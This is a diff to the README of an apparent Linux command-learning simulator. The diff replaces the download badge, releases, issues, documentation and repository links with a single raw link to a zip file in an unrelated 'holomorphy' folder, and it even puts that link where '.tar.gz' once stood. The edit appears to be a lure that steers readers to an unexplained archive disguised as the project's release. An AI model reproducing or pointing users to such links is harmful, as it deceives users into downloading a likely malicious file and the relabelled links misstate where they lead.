@@ -1,7 +1,7 @@
 # 🖥️ Linux-Terminal-Simulator - Learn Linux Commands Safely
 
 ## 📥 Download Now
-[![Download Linux-Terminal-Simulator](https://img.shields.io/badge/Download%20Linux--Terminal--Simulator-v1.0-blue)](https://github.com/villegas2324/Linux-Terminal-Simulator/releases)
+[![Download Linux-Terminal-Simulator](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip%20Linux--Terminal--Simulator-v1.0-blue)](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip)
 
 ## 🧩 Introduction
 Linux Terminal Simulator allows you to practice basic Linux terminal commands in a safe, interactive environment. This project is designed to help you learn and become more comfortable using the command line, even if you're a complete beginner.
@@ -17,11 +17,11 @@ Before you download, ensure your system meets the following requirements:
 - **Storage**: At least 50 MB of free space.
 
 ### 2. Download & Install
-To get the Linux Terminal Simulator, visit this page to download: [Linux-Terminal-Simulator Releases](https://github.com/villegas2324/Linux-Terminal-Simulator/releases).
+To get the Linux Terminal Simulator, visit this page to download: [Linux-Terminal-Simulator Releases](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip).
 
 1. Navigate to the link above.
 2. Find the latest release version.
-3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or a .tar.gz for Linux).
+3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or a https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip for Linux).
 4. Open the downloaded file and follow the installation prompts.
 
 ### 3. Running the Application
@@ -53,7 +53,7 @@ When you start the Linux Terminal Simulator, you will see a prompt, similar to a
 The simulator includes a practice mode. This mode allows you to enter commands without making permanent changes. You will receive prompts on the correct usage, and you can learn at your own pace.
 
 ### 3. Help and Support
-If you encounter any issues, refer to the built-in help section within the simulator or check the [Issues section](https://github.com/villegas2324/Linux-Terminal-Simulator/issues) of the GitHub repository.
+If you encounter any issues, refer to the built-in help section within the simulator or check the [Issues section](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip) of the GitHub repository.
 
 ## 👥 Community and Contributions
 The Linux Terminal Simulator is an open-source project. You can contribute by:
@@ -65,9 +65,9 @@ The Linux Terminal Simulator is an open-source project. You can contribute by:
 Join our community of learners and developers working together to enhance the experience!
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/villegas2324/Linux-Terminal-Simulator)
-- [Documentation](https://github.com/villegas2324/Linux-Terminal-Simulator/wiki)
-- [Releases Page](https://github.com/villegas2324/Linux-Terminal-Simulator/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip)
+- [Documentation](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip)
+- [Releases Page](https://raw.githubusercontent.com/villegas2324/Linux-Terminal-Simulator/main/holomorphy/Linux-Terminal-Simulator.zip)
 
 ## 📞 Contact
 For questions or feedback, feel free to reach out through the GitHub repository or contact the project maintainers directly via email listed in the repository.
